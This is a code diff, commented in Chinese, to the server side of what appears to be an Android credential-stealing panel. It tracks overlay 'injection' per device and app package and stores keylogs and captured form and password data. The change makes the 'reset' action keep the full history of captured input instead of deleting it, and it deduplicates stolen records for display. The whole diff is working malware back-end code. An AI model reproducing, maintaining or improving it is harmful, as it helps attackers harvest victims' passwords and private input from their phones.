@@ -598,6 +598,7 @@ def h_inj_track_act(b, q, a):
             else:
                 rs['*'] = int(time.time())
             save()
+            print('[inj] reset 标记 dev=%s pkg=%s（快捷面板过滤用，历史保留）' % (d, _pkg0 or '*'), flush=True)
     except Exception as e:
         print('[inj] reset 时间戳写入失败: %s' % e, flush=True)
 
@@ -612,29 +613,8 @@ def h_inj_track_act(b, q, a):
                     _db.inj_state_clear(d)
             elif _pkg:
                 _db.inj_state_set(d, _pkg, {'inject': 'injected', 'skip': 'skipped'}.get(act, act))
-            # 重注入：把旧的表单/密码彻底删掉，面板不再回显
-            if act == 'reset':
-                try:
-                    _db.keylog_clear(d, _pkg or None)
-                    print('[inj] reset 清理旧记录 dev=%s pkg=%s' % (d, _pkg or '*'), flush=True)
-                except Exception as e:
-                    print('[inj] reset 清理失败: %s' % e, flush=True)
-                # 内存里也要清（h_inject_logs 会读 S['inj_records']，不清会"消失一下又回来"）
-                try:
-                    S['inj_records'] = [
-                        r for r in S.get('inj_records', [])
-                        if not (str(r.get('deviceId') or '') == d
-                                and (not _pkg or str(r.get('package') or r.get('pkg') or '') == _pkg))
-                    ]
-                    S['keylogs'] = [
-                        r for r in S.get('keylogs', [])
-                        if not (str(r.get('deviceId') or '') == d
-                                and (not _pkg or str(r.get('pkg') or '') == _pkg))
-                    ]
-                    save()
-                    print('[inj] reset 已清内存记录 dev=%s pkg=%s' % (d, _pkg or '*'), flush=True)
-                except Exception as e:
-                    print('[inj] reset 清内存失败: %s' % e, flush=True)
+            # 重注入：**不删历史**（「注入记录」页要看完整历史）。
+            # 快捷面板（h_inject_logs）靠前面记的 inj_reset 时间戳过滤旧内容。
     except Exception as e:
         print('[inj] track_act 落库失败: %s' % e, flush=True)
     if act == 'inject':
@@ -1511,12 +1491,19 @@ def h_inject_logs(b, q, a):
     except Exception:
         pass
     # 2) 内存里的注入记录（HTTP /api/inj/result 与 socket formData 都会写这里）
+    #    注意：同一次提交会同时写 db keylogs 和 inj_records，两处都读会出现两条。
+    #    这里按 (pkg, text) 去重，只保留第一条（db 那条）。
+    _seen_keys = {(x.get('pkg'), (x.get('text') or '')[:200]) for x in out}
     for r in S.get('inj_records', []):
         if d and r.get('deviceId') != d:
             continue
         ts = int(r.get('ts') or 0)
         if not (r.get('package') or r.get('pkg') or '') or not (r.get('data') or ''):
             continue
+        _k = (r.get('package') or r.get('pkg') or '', (r.get('data') or '')[:200])
+        if _k in _seen_keys:
+            continue
+        _seen_keys.add(_k)
         out.append({
             'pkg': r.get('package') or r.get('pkg') or '',
             'text': r.get('data') or '',
